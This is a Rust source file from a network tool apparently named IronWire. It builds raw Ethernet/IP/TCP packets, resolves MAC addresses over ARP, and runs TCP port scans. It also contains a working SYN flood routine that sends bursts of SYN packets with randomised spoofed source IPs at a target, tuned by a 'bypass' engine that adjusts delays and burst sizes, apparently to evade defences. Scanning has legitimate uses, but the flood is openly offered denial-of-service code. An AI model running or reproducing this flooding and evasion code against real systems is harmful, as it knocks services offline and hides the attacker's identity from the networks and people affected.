/// IronWire — Session & Packet Building
///
/// Raw packet construction, ARP resolution, datalink channel management,
/// port scanning, and SYN flooding primitives.

use std::collections::HashSet;
use std::io::Write;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{
           AtomicU64, AtomicUsize, Ordering
           };
use std::time::Duration;

use rand::Rng;
use pnet::datalink::{
    self, Channel};
use pnet::packet::arp::{
    ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{
    EtherTypes, MutableEthernetPacket, 
    EthernetPacket
};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::{
    Ipv4Packet, MutableIpv4Packet
};
use pnet::packet::tcp::{TcpFlags, TcpPacket,
     MutableTcpPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;

use crate::profile;
use crate::bypass::BypassEngine;

/// Aggregate packet statistics shared across workers.
pub struct PacketStats {
    pub packets_sent: Arc<AtomicU64>,
    pub packets_failed: Arc<AtomicU64>,
    pub open_ports: Arc<AtomicUsize>,
    pub start_time: std::time::Instant,
}

impl PacketStats {
    /// Creates a new `PacketStats` with all counters at zero.
    pub fn new() -> Self {
        Self {
            packets_sent: Arc::new(AtomicU64::new(0)),
            packets_failed: Arc::new(AtomicU64::new(0)),
            open_ports: Arc::new(AtomicUsize::new(0)),
            start_time: std::time::Instant::now(),
        }
    }
}

/// Opens a datalink channel (AF_PACKET socket) on the given interface.
pub fn open_datalink(iface_name: &str, read_timeout_ms: u64) -> Option<(Box<dyn datalink::DataLinkSender>, Box<dyn datalink::DataLinkReceiver>)> {
    let ifaces = datalink::interfaces();
    let iface = ifaces.iter().find(|i| i.name == iface_name)?;
    let config = datalink::Config {
        read_timeout: Some(Duration::from_millis(read_timeout_ms)),
        ..Default::default()
    };
    match datalink::channel(iface, config).ok()? {
        Channel::Ethernet(tx, rx) => Some((tx, rx)),
        _ => None,
    }
}

/// Resolves a target MAC address by sending an ARP request.
pub fn resolve_target_mac(iface_name: &str, target_ip: Ipv4Addr) -> Option<MacAddr> {
    let ifaces = datalink::interfaces();
    let iface = ifaces.iter().find(|i| i.name == iface_name)?;
    let source_ip = iface.ips.iter().find(|i| i.is_ipv4())?.ip();
    let source_mac = iface.mac?;

    let config = datalink::Config {
        read_timeout: Some(Duration::from_millis(500)),
        ..Default::default()
    };
    let (mut tx, mut rx) = match datalink::channel(iface, config).ok()? {
        Channel::Ethernet(tx, rx) => (tx, rx),
        _ => return None,
    };

    // Build ARP request
    let mut buf = vec![0u8; 42];
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..14])
            .expect("ethernet header buf too small");
        eth.set_destination(MacAddr::broadcast());
        eth.set_source(source_mac);
        eth.set_ethertype(EtherTypes::Arp);
    }
    {
        let mut arp = MutableArpPacket::new(&mut buf[14..])
            .expect("arp packet buf too small");
        arp.set_hardware_type(pnet::packet::arp::ArpHardwareType(1));
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(ArpOperations::Request);
        arp.set_sender_hw_addr(source_mac);
        if let std::net::IpAddr::V4(v4) = source_ip {
            arp.set_sender_proto_addr(v4);
        }
        arp.set_target_hw_addr(MacAddr::zero());
        arp.set_target_proto_addr(target_ip);
    }

    let _ = tx.send_to(&buf, None);

    // Wait for ARP reply
    let deadline = std::time::Instant::now() + Duration::from_secs(3);
    while std::time::Instant::now() < deadline {
        match rx.next() {
            Ok(packet) => {
                if let Some(eth) = EthernetPacket::new(packet) {
                    if eth.get_ethertype() == EtherTypes::Arp {
                        if let Some(arp) = ArpPacket::new(eth.payload()) {
                            if arp.get_operation() == ArpOperations::Reply
                                && arp.get_sender_proto_addr() == target_ip
                            {
                                return Some(arp.get_sender_hw_addr());
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
    }
    None
}

/// Converts a hex string to an IPv4 address.
fn hex_to_ipv4(hex: &str) -> Option<Ipv4Addr> {
    let raw = u32::from_str_radix(hex, 16).ok()?;
    let [a, b, c, d] = raw.to_be_bytes();
    Some(Ipv4Addr::new(a, b, c, d))
}

/// Reads `/proc/net/route` to find the gateway IP for the given interface.
pub fn resolve_gateway_ip(iface_name: &str) -> Option<Ipv4Addr> {
    let routes = std::fs::read_to_string("/proc/net/route").ok()?;
    for line in routes.lines().skip(1) {
        let fields: Vec<&str> = line.split_whitespace().collect();
        if fields.len() < 3 { continue; }
        if fields[0] != iface_name { continue; }
        if fields[1] != "00000000" { continue; }
        if fields[2] == "00000000" { continue; }
        return hex_to_ipv4(fields[2]);
    }
    None
}

/// Resolves any IP on the local network to a MAC via ARP.
pub fn resolve_mac(iface_name: &str, ip: Ipv4Addr) -> Option<MacAddr> {
    let ifaces = datalink::interfaces();
    let iface = ifaces.iter().find(|i| i.name == iface_name)?;
    let source_ip = iface.ips.iter().find(|i| i.is_ipv4())?.ip();
    let source_mac = iface.mac?;

    let config = datalink::Config {
        read_timeout: Some(Duration::from_millis(500)),
        ..Default::default()
    };
    let (mut tx, mut rx) = match datalink::channel(iface, config).ok()? {
        Channel::Ethernet(tx, rx) => (tx, rx),
        _ => return None,
    };

    let mut buf = vec![0u8; 42];
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..14])
            .expect("ethernet header buf too small");
        eth.set_destination(MacAddr::broadcast());
        eth.set_source(source_mac);
        eth.set_ethertype(EtherTypes::Arp);
    }
    {
        let mut arp = MutableArpPacket::new(&mut buf[14..])
            .expect("arp packet buf too small");
        arp.set_hardware_type(pnet::packet::arp::ArpHardwareType(1));
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(ArpOperations::Request);
        arp.set_sender_hw_addr(source_mac);
        if let std::net::IpAddr::V4(v4) = source_ip {
            arp.set_sender_proto_addr(v4);
        }
        arp.set_target_hw_addr(MacAddr::zero());
        arp.set_target_proto_addr(ip);
    }

    let _ = tx.send_to(&buf, None);

    let deadline = std::time::Instant::now() + Duration::from_secs(3);
    while std::time::Instant::now() < deadline {
        match rx.next() {
            Ok(packet) => {
                if let Some(eth) = EthernetPacket::new(packet) {
                    if eth.get_ethertype() == EtherTypes::Arp {
                        if let Some(arp) = ArpPacket::new(eth.payload()) {
                            if arp.get_operation() == ArpOperations::Reply
                                && arp.get_sender_proto_addr() == ip
                            {
                                return Some(arp.get_sender_hw_addr());
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
    }
    None
}

/// Resolves the destination MAC: manual override, direct ARP, or gateway.
pub fn resolve_dst_mac(iface_name: &str, target_ip: Ipv4Addr, manual_mac: Option<MacAddr>) -> Option<MacAddr> {
    if let Some(mac) = manual_mac {
        return Some(mac);
    }

    if let Some(mac) = resolve_target_mac(iface_name, target_ip) {
        return Some(mac);
    }

    let gateway_ip = resolve_gateway_ip(iface_name)?;
    tracing::info!("Target not on local subnet — using gateway: {}", gateway_ip);
    resolve_mac(iface_name, gateway_ip)
}

/// Builds a complete Ethernet/IP/TCP packet for raw transmission.
pub fn build_tcp_packet(
    source_ip: Ipv4Addr, dest_ip: Ipv4Addr,
    source_port: u16, dest_port: u16,
    flags: u8, src_mac: MacAddr, dst_mac: MacAddr,
    random_opts: bool,
) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let tcp_opts = if random_opts { profile::generate_tcp_options() } else { Vec::new() };
    let tcp_hdr_size = 20 + tcp_opts.len();
    let total = 14 + 20 + tcp_hdr_size;
    let mut buf = vec![0u8; total];

    // Ethernet header
    {
        let mut eth = MutableEthernetPacket::new(&mut buf[..14])
            .expect("ethernet header buf too small");
        eth.set_destination(dst_mac);
        eth.set_source(src_mac);
        eth.set_ethertype(EtherTypes::Ipv4);
    }
    // IP header
    {
        let mut ip = MutableIpv4Packet::new(&mut buf[14..14 + 20 + tcp_hdr_size])
            .expect("ip header buf too small");
        ip.set_version(4);
        ip.set_header_length(5);
        ip.set_total_length((20 + tcp_hdr_size) as u16);
        ip.set_identification(rng.gen::<u16>());
        ip.set_ttl(rng.gen_range(32..128));
        ip.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip.set_source(source_ip);
        ip.set_destination(dest_ip);
        ip.set_checksum(pnet::packet::ipv4::checksum(&ip.to_immutable()));
    }
    // TCP options
    let tcp_off = 34;
    if !tcp_opts.is_empty() {
        buf[tcp_off + 20..tcp_off + 20 + tcp_opts.len()].copy_from_slice(&tcp_opts);
    }
    // TCP header
    {
        let mut tcp = MutableTcpPacket::new(&mut buf[tcp_off..])
            .expect("tcp header buf too small");
        tcp.set_source(source_port);
        tcp.set_destination(dest_port);
        tcp.set_sequence(rng.gen::<u32>());
        tcp.set_acknowledgement(0);
        tcp.set_data_offset(((20 + tcp_opts.len()) / 4) as u8);
        tcp.set_flags(flags);
        tcp.set_window(rng.gen_range(8192..65535));
        let csum = pnet::packet::tcp::ipv4_checksum(&tcp.to_immutable(), &source_ip, &dest_ip);
        tcp.set_checksum(csum);
    }
    buf
}

/// Parses a raw frame, returning the source port and TCP flags if it matches
/// the expected source IP.
fn parse_tcp_response(frame: &[u8], expect_src: Ipv4Addr) -> Option<(u16, u8)> {
    let eth = EthernetPacket::new(frame)?;
    if eth.get_ethertype() != EtherTypes::Ipv4 { return None; }
    let ip = Ipv4Packet::new(eth.payload())?;
    if ip.get_source() != expect_src { return None; }
    if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { return None; }
    let tcp = TcpPacket::new(ip.payload())?;
    Some((tcp.get_source(), tcp.get_flags()))
}

/// Runs a TCP port scan against the target, reporting open ports.
pub async fn run_port_scan(
    iface: &str,
    src_mac: MacAddr,
    src_ip: Ipv4Addr,
    dst_mac: MacAddr,
    target_ip: Ipv4Addr,
    ports: &[u16],
    scan_type: &str,
    random_opts: bool,
    source_vary: bool,
    random_ports: bool,
    stats: Arc<PacketStats>,
    bypass: &mut BypassEngine,
) -> HashSet<u16> {
    let (_tx, mut _rx) = match open_datalink(iface, 100) {
        Some((tx, rx)) => (tx, rx),
        None => { tracing::error!("datalink channel: {}", iface); return HashSet::new(); }
    };

    let flags = profile::get_scan_flags(scan_type);
    let stats_rx = Arc::clone(&stats);
    let scan_type_owned = scan_type.to_string();
    let scan_ports: Vec<u16> = ports.to_vec();
    let t_ip = target_ip;

    // Listener: captures responses in a blocking thread
    let recv_handle = tokio::task::spawn_blocking(move || {
        let mut found: HashSet<u16> = HashSet::new();
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(8) {
            match _rx.next() {
                Ok(frame) => {
                    if let Some((rport, f)) = parse_tcp_response(&frame, t_ip) {
                        if scan_ports.contains(&rport) {
                            if (f & TcpFlags::SYN) != 0 && (f & TcpFlags::ACK) != 0 {
                                if found.insert(rport) {
                                    stats_rx.open_ports.fetch_add(1, Ordering::Relaxed);
                                }
                            } else if (f & TcpFlags::ACK) != 0 && scan_type_owned == "ack" {
                                if found.insert(rport) {
                                    stats_rx.open_ports.fetch_add(1, Ordering::Relaxed);
                                }
                            }
                        }
                    }
                }
                Err(_) => {}
            }
        }
        found
    });

    // Send probe packets
    let mut tx = match open_datalink(iface, 100) {
        Some((tx, _rx)) => { drop(_rx); tx }
        None => return HashSet::new(),
    };

    for (idx, &port) in ports.iter().enumerate() {
        let s_ip = if source_vary { profile::random_ip() } else { src_ip };
        let s_port = if random_ports { profile::random_port() } else { port };
        let pkt = build_tcp_packet(s_ip, target_ip, s_port, port, flags, src_mac, dst_mac, random_opts);
        let ok = tx.send_to(&pkt, None).is_some();
        if ok {
            stats.packets_sent.fetch_add(1, Ordering::Relaxed);
        } else {
            stats.packets_failed.fetch_add(1, Ordering::Relaxed);
        }
        bypass.record(ok);

        let delay = bypass.next_delay();
        if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }

        if idx % 100 == 0 {
            let sent = stats.packets_sent.load(Ordering::Relaxed);
            let fail = stats.packets_failed.load(Ordering::Relaxed);
            let open = stats.open_ports.load(Ordering::Relaxed);
            let total = ports.len();
            print!("\rscan-> {} / {} | open: {} | sent: {} | drop: {} | delay: {}ms", idx + 1, total, open, sent, fail, delay);
            let _ = std::io::stdout().flush();
        }
    }

    match recv_handle.await {
        Ok(found) => {
            println!("\nScan complete: {} open ports", found.len());
            for p in found.iter() { println!("  → {}", p); }
            found
        }
        Err(_) => HashSet::new(),
    }
}

/// Runs a SYN flood against the target with configurable burst size,
/// source IP/port variation, and delay between bursts.
pub async fn run_syn_flood(
    iface: &str,
    src_mac: MacAddr,
    src_ip: Ipv4Addr,
    dst_mac: MacAddr,
    target_ip: Ipv4Addr,
    ports: &[u16],
    connections: usize,
    duration: u64,
    source_vary: bool,
    random_ports: bool,
    stats: Arc<PacketStats>,
    bypass: &mut BypassEngine,
) {
    let (mut tx, mut rx) = match open_datalink(iface, 100) {
        Some((tx, rx)) => (tx, rx),
        None => { tracing::error!("datalink channel: {}", iface); return; }
    };

    let stats_rx = Arc::clone(&stats);
    let t_ip = target_ip;

    tokio::task::spawn_blocking(move || {
        let start = std::time::Instant::now();
        while start.elapsed() < Duration::from_secs(duration + 5) {
            match rx.next() {
                Ok(frame) => {
                    if let Some((_rport, f)) = parse_tcp_response(&frame, t_ip) {
                        if (f & TcpFlags::SYN) != 0 && (f & TcpFlags::ACK) != 0 {
                            stats_rx.open_ports.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                }
                Err(_) => {}
            }
        }
    });

    let deadline = std::time::Instant::now() + Duration::from_secs(duration);
    let burst = std::cmp::min(connections, bypass.burst_size);

    while std::time::Instant::now() < deadline {
        for _ in 0..burst {
            let s_ip = if source_vary { profile::random_ip() } else { src_ip };
            let s_port = if random_ports { profile::random_port() } else { 31337 };
            let d_port = ports[rand::thread_rng().gen_range(0..ports.len())];
            let pkt = build_tcp_packet(s_ip, target_ip, s_port, d_port, TcpFlags::SYN, src_mac, dst_mac, true);
            let ok = tx.send_to(&pkt, None).is_some();
            if ok {
                stats.packets_sent.fetch_add(1, Ordering::Relaxed);
            } else {
                stats.packets_failed.fetch_add(1, Ordering::Relaxed);
            }
            bypass.record(ok);
        }

        let delay = bypass.next_delay();
        if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }

        let sent = stats.packets_sent.load(Ordering::Relaxed);
        let fail = stats.packets_failed.load(Ordering::Relaxed);
        let open = stats.open_ports.load(Ordering::Relaxed);
        let elapsed = stats.start_time.elapsed().as_secs_f64();
        let pps = if elapsed > 0.0 { sent as f64 / elapsed } else { 0.0 };
        print!("\rflood -> sent: {} | drop: {} | syn-ack: {} | {:.0} pps | delay: {}ms", sent, fail, open, pps, delay);
        let _ = std::io::stdout().flush();
    }
    println!();
}
